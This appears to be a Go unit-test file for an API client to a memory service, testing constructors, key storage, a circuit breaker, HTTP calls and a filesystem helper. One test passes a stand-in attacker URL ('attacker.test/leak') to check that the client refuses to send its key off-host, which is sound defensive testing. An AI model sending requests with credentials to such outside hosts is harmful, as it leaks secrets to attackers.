// SPDX-License-Identifier: EUPL-1.2

package client

import (
	"context"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"path/filepath"
	"strings"
	"time"

	core "dappco.re/go"
)

type T = core.T

var (
	AssertContains = core.AssertContains
	AssertEqual    = core.AssertEqual
	AssertError    = core.AssertError
	AssertFalse    = core.AssertFalse
	AssertLen      = core.AssertLen
	AssertNil      = core.AssertNil
	AssertNoError  = core.AssertNoError
	AssertNotNil   = core.AssertNotNil
	AssertPanics   = core.AssertPanics
	AssertTrue     = core.AssertTrue
	RequireNoError = core.RequireNoError
)

func ax7Client(t *T, handler http.HandlerFunc) (*Client, *httptest.Server) {
	t.Helper()
	server := httptest.NewTLSServer(handler)
	client := New(Options{
		URL:         server.URL,
		Key:         "test-key",
		Org:         "core",
		AgentID:     "codex",
		HTTPClient:  server.Client(),
		MaxAttempts: 1,
		BaseDelay:   time.Nanosecond,
	})
	return client, server
}

func ax7WriteJSON(t *T, w http.ResponseWriter, status int, payload any) {
	t.Helper()
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(status)
	if err := json.NewEncoder(w).Encode(payload); err != nil {
		t.Fatalf("encode response: %v", err)
	}
}

func ax7LocalFS(t *T) *localCoreFS {
	t.Helper()
	root, err := filepath.EvalSymlinks(t.TempDir())
	RequireNoError(t, err)
	return &localCoreFS{fs: (&core.Fs{}).New(root)}
}

func TestAX7_New_Good(t *T) {
	c := New(Options{URL: DefaultURL, Key: "test-key", Org: "core", AgentID: "codex"})
	AssertEqual(t, DefaultURL, c.apiURL)
	AssertEqual(t, "codex", c.agentID)
}

func TestAX7_New_Bad(t *T) {
	c := New(Options{URL: "://bad", Key: "test-key"})
	AssertNotNil(t, c.configErr)
	AssertContains(t, c.configErr.Error(), "invalid API URL")
}

func TestAX7_New_Ugly(t *T) {
	c := New(Options{})
	AssertEqual(t, DefaultURL, c.apiURL)
	AssertEqual(t, defaultAgentID, c.agentID)
}

func TestAX7_NewFromEnvironment_Good(t *T) {
	t.Setenv("CORE_BRAIN_KEY", "env-key")
	t.Setenv("CORE_BRAIN_URL", DefaultURL)
	c := NewFromEnvironment()
	AssertEqual(t, "env-key", c.apiKey)
	AssertEqual(t, DefaultURL, c.apiURL)
}

func TestAX7_NewFromEnvironment_Bad(t *T) {
	t.Setenv("CORE_BRAIN_KEY", "env-key")
	t.Setenv("CORE_BRAIN_URL", "://bad")
	c := NewFromEnvironment()
	AssertNotNil(t, c.configErr)
	AssertContains(t, c.configErr.Error(), "invalid API URL")
}

func TestAX7_NewFromEnvironment_Ugly(t *T) {
	t.Setenv("HOME", t.TempDir())
	t.Setenv("CORE_BRAIN_KEY", "")
	AssertNoError(t, WriteBrainKey("file-key"))
	c := NewFromEnvironment()
	AssertEqual(t, "file-key", c.apiKey)
}

func TestAX7_WriteBrainKey_Good(t *T) {
	t.Setenv("HOME", t.TempDir())
	AssertNoError(t, WriteBrainKey("test-key"))
	got, err := readBrainKeyFile(brainKeyPath(core.Env("HOME")))
	AssertNoError(t, err)
	AssertEqual(t, "test-key", got)
}

func TestAX7_WriteBrainKey_Bad(t *T) {
	t.Setenv("HOME", "")
	err := WriteBrainKey("test-key")
	AssertError(t, err)
	AssertContains(t, err.Error(), "HOME not set")
}

func TestAX7_WriteBrainKey_Ugly(t *T) {
	t.Setenv("HOME", t.TempDir())
	AssertNoError(t, WriteBrainKey("  test-key  "))
	got, err := readBrainKeyFile(brainKeyPath(core.Env("HOME")))
	AssertNoError(t, err)
	AssertEqual(t, "test-key", got)
}

func TestAX7_NewCircuitBreaker_Good(t *T) {
	breaker := NewCircuitBreaker(CircuitBreakerOptions{FailureThreshold: 2, SuccessThreshold: 2, Cooldown: time.Second})
	AssertEqual(t, CircuitClosed, breaker.State())
	AssertEqual(t, 2, breaker.failureThreshold)
}

func TestAX7_NewCircuitBreaker_Bad(t *T) {
	breaker := NewCircuitBreaker(CircuitBreakerOptions{})
	AssertEqual(t, defaultFailureThreshold, breaker.failureThreshold)
	AssertEqual(t, CircuitClosed, breaker.State())
}

func TestAX7_NewCircuitBreaker_Ugly(t *T) {
	breaker := NewCircuitBreaker(CircuitBreakerOptions{FailureThreshold: -1, SuccessThreshold: -1, Cooldown: -1})
	AssertEqual(t, defaultSuccessThreshold, breaker.successThreshold)
	AssertEqual(t, defaultCircuitCooldown, breaker.cooldown)
}

func TestAX7_CircuitBreaker_State_Good(t *T) {
	breaker := NewCircuitBreaker(CircuitBreakerOptions{})
	state := breaker.State()
	AssertEqual(t, CircuitClosed, state)
}

func TestAX7_CircuitBreaker_State_Bad(t *T) {
	var breaker *CircuitBreaker
	state := breaker.State()
	AssertEqual(t, CircuitClosed, state)
}

func TestAX7_CircuitBreaker_State_Ugly(t *T) {
	breaker := NewCircuitBreaker(CircuitBreakerOptions{Cooldown: time.Nanosecond})
	breaker.state = CircuitOpen
	breaker.openedAt = time.Now().Add(-time.Second)
	AssertEqual(t, CircuitHalfOpen, breaker.State())
}

func TestAX7_Client_Remember_Good(t *T) {
	c, server := ax7Client(t, func(w http.ResponseWriter, r *http.Request) {
		AssertEqual(t, http.MethodPost, r.Method)
		AssertEqual(t, "/v1/brain/remember", r.URL.Path)
		ax7WriteJSON(t, w, http.StatusOK, map[string]any{"id": "mem-1"})
	})
	defer server.Close()
	result, err := c.Remember(context.Background(), RememberInput{Content: "remember", Type: "decision"})
	AssertNoError(t, err)
	AssertEqual(t, "mem-1", result["id"])
}

func TestAX7_Client_Remember_Bad(t *T) {
	c := New(Options{URL: DefaultURL})
	result, err := c.Remember(context.Background(), RememberInput{Content: "remember"})
	AssertError(t, err)
	AssertNil(t, result)
}

func TestAX7_Client_Remember_Ugly(t *T) {
	c, server := ax7Client(t, func(w http.ResponseWriter, r *http.Request) {
		AssertContains(t, r.Header.Get("Authorization"), "Bearer")
		ax7WriteJSON(t, w, http.StatusOK, map[string]any{"id": "mem-empty"})
	})
	defer server.Close()
	result, err := c.Remember(context.Background(), RememberInput{})
	AssertNoError(t, err)
	AssertEqual(t, "mem-empty", result["id"])
}

func TestAX7_Client_Recall_Good(t *T) {
	c, server := ax7Client(t, func(w http.ResponseWriter, r *http.Request) {
		AssertEqual(t, "/v1/brain/recall", r.URL.Path)
		ax7WriteJSON(t, w, http.StatusOK, map[string]any{"memories": []any{}})
	})
	defer server.Close()
	result, err := c.Recall(context.Background(), RecallInput{Query: "query"})
	AssertNoError(t, err)
	AssertNotNil(t, result["memories"])
}

func TestAX7_Client_Recall_Bad(t *T) {
	c := New(Options{URL: DefaultURL})
	result, err := c.Recall(context.Background(), RecallInput{Query: "query"})
	AssertError(t, err)
	AssertNil(t, result)
}

func TestAX7_Client_Recall_Ugly(t *T) {
	c, server := ax7Client(t, func(w http.ResponseWriter, r *http.Request) {
		ax7WriteJSON(t, w, http.StatusOK, map[string]any{"memories": []any{map[string]any{"id": "m1"}}})
	})
	defer server.Close()
	result, err := c.Recall(context.Background(), RecallInput{})
	AssertNoError(t, err)
	AssertLen(t, result["memories"], 1)
}

func TestAX7_Client_Forget_Good(t *T) {
	c, server := ax7Client(t, func(w http.ResponseWriter, r *http.Request) {
		AssertEqual(t, http.MethodDelete, r.Method)
		AssertEqual(t, "/v1/brain/forget/mem-1", r.URL.Path)
		ax7WriteJSON(t, w, http.StatusOK, map[string]any{"forgotten": "mem-1"})
	})
	defer server.Close()
	result, err := c.Forget(context.Background(), ForgetInput{ID: "mem-1"})
	AssertNoError(t, err)
	AssertEqual(t, "mem-1", result["forgotten"])
}

func TestAX7_Client_Forget_Bad(t *T) {
	c := New(Options{URL: DefaultURL})
	result, err := c.Forget(context.Background(), ForgetInput{ID: "mem-1"})
	AssertError(t, err)
	AssertNil(t, result)
}

func TestAX7_Client_Forget_Ugly(t *T) {
	c, server := ax7Client(t, func(w http.ResponseWriter, r *http.Request) {
		AssertTrue(t, strings.HasPrefix(r.URL.Path, "/v1/brain/forget/"))
		ax7WriteJSON(t, w, http.StatusOK, map[string]any{"forgotten": ""})
	})
	defer server.Close()
	result, err := c.Forget(context.Background(), ForgetInput{})
	AssertNoError(t, err)
	AssertEqual(t, "", result["forgotten"])
}

func TestAX7_Client_List_Good(t *T) {
	c, server := ax7Client(t, func(w http.ResponseWriter, r *http.Request) {
		AssertEqual(t, "core", r.URL.Query().Get("org"))
		AssertEqual(t, "50", r.URL.Query().Get("limit"))
		ax7WriteJSON(t, w, http.StatusOK, map[string]any{"memories": []any{}})
	})
	defer server.Close()
	result, err := c.List(context.Background(), ListInput{})
	AssertNoError(t, err)
	AssertNotNil(t, result["memories"])
}

func TestAX7_Client_List_Bad(t *T) {
	c := New(Options{URL: DefaultURL})
	result, err := c.List(context.Background(), ListInput{})
	AssertError(t, err)
	AssertNil(t, result)
}

func TestAX7_Client_List_Ugly(t *T) {
	c, server := ax7Client(t, func(w http.ResponseWriter, r *http.Request) {
		AssertEqual(t, "-1", r.URL.Query().Get("limit"))
		ax7WriteJSON(t, w, http.StatusOK, map[string]any{"memories": []any{}})
	})
	defer server.Close()
	result, err := c.List(context.Background(), ListInput{Limit: -1})
	AssertNoError(t, err)
	AssertNotNil(t, result["memories"])
}

func TestAX7_Client_Call_Good(t *T) {
	c, server := ax7Client(t, func(w http.ResponseWriter, r *http.Request) {
		AssertEqual(t, "/v1/brain/status", r.URL.Path)
		ax7WriteJSON(t, w, http.StatusOK, map[string]any{"ok": true})
	})
	defer server.Close()
	result, err := c.Call(context.Background(), http.MethodGet, "/v1/brain/status", nil)
	AssertNoError(t, err)
	AssertEqual(t, true, result["ok"])
}

func TestAX7_Client_Call_Bad(t *T) {
	c := New(Options{URL: DefaultURL, Key: "test-key"})
	result, err := c.Call(context.Background(), http.MethodGet, "https://attacker.test/leak", nil)
	AssertError(t, err)
	AssertNil(t, result)
}

func TestAX7_Client_Call_Ugly(t *T) {
	c, server := ax7Client(t, func(w http.ResponseWriter, r *http.Request) {
		AssertEqual(t, "/relative", r.URL.Path)
		ax7WriteJSON(t, w, http.StatusOK, map[string]any{"relative": true})
	})
	defer server.Close()
	result, err := c.Call(context.Background(), http.MethodGet, "relative", nil)
	AssertNoError(t, err)
	AssertEqual(t, true, result["relative"])
}

func TestAX7_CoreFS_Stat_Good(t *T) {
	fs := ax7LocalFS(t)
	AssertNoError(t, fs.WriteMode("a.txt", "ok", core.FileMode(0o600)))
	info, err := fs.Stat("a.txt")
	AssertNoError(t, err)
	AssertEqual(t, "a.txt", info.Name())
}

func TestAX7_CoreFS_Stat_Bad(t *T) {
	fs := ax7LocalFS(t)
	info, err := fs.Stat("missing.txt")
	AssertError(t, err)
	AssertNil(t, info)
}

func TestAX7_CoreFS_Stat_Ugly(t *T) {
	fs := ax7LocalFS(t)
	AssertTrue(t, fs.fs.EnsureDir("dir").OK)
	info, err := fs.Stat("dir")
	AssertNoError(t, err)
	AssertTrue(t, info.IsDir())
}

func TestAX7_CoreFS_Read_Good(t *T) {
	fs := ax7LocalFS(t)
	AssertNoError(t, fs.WriteMode("a.txt", "ok", core.FileMode(0o600)))
	got, err := fs.Read("a.txt")
	AssertNoError(t, err)
	AssertEqual(t, "ok", got)
}

func TestAX7_CoreFS_Read_Bad(t *T) {
	fs := ax7LocalFS(t)
	got, err := fs.Read("missing.txt")
	AssertError(t, err)
	AssertEqual(t, "", got)
}

func TestAX7_CoreFS_Read_Ugly(t *T) {
	fs := ax7LocalFS(t)
	AssertNoError(t, fs.WriteMode("empty.txt", "", core.FileMode(0o600)))
	got, err := fs.Read("empty.txt")
	AssertNoError(t, err)
	AssertEqual(t, "", got)
}

func TestAX7_CoreFS_WriteMode_Good(t *T) {
	fs := ax7LocalFS(t)
	err := fs.WriteMode("a.txt", "ok", core.FileMode(0o600))
	AssertNoError(t, err)
	AssertTrue(t, fs.fs.IsFile("a.txt"))
}

func TestAX7_CoreFS_WriteMode_Bad(t *T) {
	fs := &localCoreFS{}
	AssertPanics(t, func() { _ = fs.WriteMode("a.txt", "ok", core.FileMode(0o600)) })
	AssertNil(t, fs.fs)
}

func TestAX7_CoreFS_WriteMode_Ugly(t *T) {
	fs := ax7LocalFS(t)
	AssertTrue(t, fs.fs.EnsureDir("nested").OK)
	err := fs.WriteMode("nested/a.txt", "", core.FileMode(0o600))
	AssertNoError(t, err)
	AssertTrue(t, fs.fs.IsFile("nested/a.txt"))
}
